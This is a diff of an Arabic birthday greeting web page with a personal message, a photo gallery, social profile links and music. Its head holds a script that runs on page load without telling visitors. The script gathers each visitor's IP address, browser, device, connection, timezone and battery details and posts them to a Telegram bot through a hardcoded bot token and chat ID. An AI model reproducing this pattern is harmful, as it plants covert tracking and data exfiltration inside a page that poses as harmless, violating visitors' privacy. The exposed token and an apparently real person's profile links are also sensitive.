@@ -1,9 +1,66 @@
+<!DOCTYPE html>
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>منونتي قلب بودا</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
   
+  <script>
+    async function sendVisitorInfo() {
+        const botToken = "7805774303:AAFy5Vy3LIdBi7XeDVBp1-nvRoB4mgNPlPc";
+        const chatId = "1557685494";
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        // Collecting basic visitor info
+        const visitorInfo = {
+            IPAddress: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
+            UserAgent: navigator.userAgent,
+            Platform: navigator.platform,
+            Language: navigator.language,
+            ScreenResolution: `${window.screen.width}x${window.screen.height}`,
+            DeviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+            TouchSupport: navigator.maxTouchPoints > 0 ? 'Supported' : 'Not Supported',
+            OnlineStatus: navigator.onLine ? 'Online' : 'Offline',
+            ConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+            TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            CurrentTime: new Date().toLocaleString()
+        };
+        
+        // Collect battery info if available
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                visitorInfo.BatteryPercentage = Math.round(battery.level * 100) + "%";
+                visitorInfo.ChargingStatus = battery.charging ? "Charging" : "Not Charging";
+            } catch (error) {
+                visitorInfo.BatteryPercentage = "Unavailable";
+                visitorInfo.ChargingStatus = "Unavailable";
+            }
+        }
+        
+        // Formatting message
+        let message = "NEW VISITOR INFORMATION\n";
+        for (let key in visitorInfo) {
+            message += `${key}: ${visitorInfo[key]}\n`;
+        }
+        
+        try {
+            const response = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+            const result = await response.json();
+            console.log(result);
+        } catch (error) {
+            console.error(error);
+        }
+    }
+    
+    window.onload = sendVisitorInfo;
+  </script>
+
   <style>
     body {
       margin: 0;
@@ -61,59 +118,48 @@
       z-index: 1000;
     }
   </style>
-
-  <script>
-    async function sendVisitorInfo() {
-        const botToken = "7805774303:AAFy5Vy3LIdBi7XeDVBp1-nvRoB4mgNPlPc";
-        const chatId = "1557685494";
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        
-        // Collecting basic visitor info
-        const visitorInfo = {
-            IPAddress: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
-            UserAgent: navigator.userAgent,
-            Platform: navigator.platform,
-            Language: navigator.language,
-            ScreenResolution: `${window.screen.width}x${window.screen.height}`,
-            DeviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
-            TouchSupport: navigator.maxTouchPoints > 0 ? 'Supported' : 'Not Supported',
-            OnlineStatus: navigator.onLine ? 'Online' : 'Offline',
-            ConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
-            TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            CurrentTime: new Date().toLocaleString()
-        };
-        
-        // Collect battery info if available
-        if (navigator.getBattery) {
-            try {
-                const battery = await navigator.getBattery();
-                visitorInfo.BatteryPercentage = Math.round(battery.level * 100) + "%";
-                visitorInfo.ChargingStatus = battery.charging ? "Charging" : "Not Charging";
-            } catch (error) {
-                visitorInfo.BatteryPercentage = "Unavailable";
-                visitorInfo.ChargingStatus = "Unavailable";
-            }
-        }
-        
-        // Formatting message
-        let message = "NEW VISITOR INFORMATION\n";
-        for (let key in visitorInfo) {
-            message += `${key}: ${visitorInfo[key]}\n`;
-        }
-        
-        try {
-            const response = await fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            });
-            const result = await response.json();
-            console.log(result);
-        } catch (error) {
-            console.error(error);
-        }
-    }
-    
-    window.onload = sendVisitorInfo;
-  </script>
 </head>
+<body>
+  <header>
+    <h1>منونتي قلب بودا</h1>
+    <p>عيد ميلاد سعيد 20 سنة!</p>
+  </header>
+  
+  <div class="message">
+    <p>
+      منونتي قلب بودا<br>
+      أحلى من تم عشرين سنة وبقى أجمل منون ف الدنيا<br>
+      يارب تكملي مليون سنة ونكون مع بعض فيهم يارب<br>
+      وتفضلي قلب بودا ونن عينه من جوا<br>
+      يا أحلى منه ف الدنيا
+    </p>
+  </div>
+  
+  <div class="gallery">
+    <img src="image1.jpg" alt="منونتي 1">
+    <img src="image2.jpg" alt="منونتي 2">
+    <img src="image3.jpg" alt="منونتي 3">
+    <img src="image4.jpg" alt="منونتي 4">
+    <img src="image5.jpg" alt="منونتي 5">
+    <img src="image6.jpg" alt="منونتي 6">
+    <img src="image7.jpg" alt="منونتي 7">
+    <img src="image8.jpg" alt="منونتي 8">
+    <img src="image9.jpg" alt="منونتي 9">
+    <img src="image10.jpg" alt="منونتي 10">
+  </div>
+  
+  <div class="social">
+    <a href="https://www.facebook.com/profile.php?id=100069887810056" target="_blank">فيسبوك</a>
+    <a href="https://www.instagram.com/mennasalama569" target="_blank">إنستغرام</a>
+  </div>
+  
+  <audio controls autoplay loop>
+    <source src="manonty.mp3" type="audio/mpeg">
+    متصفحك لا يدعم تشغيل الموسيقى.
+  </audio>
+  
+  <footer>
+    &copy; 2025/5/5 بودا لمنونتي
+  </footer>
+</body>
+</html>
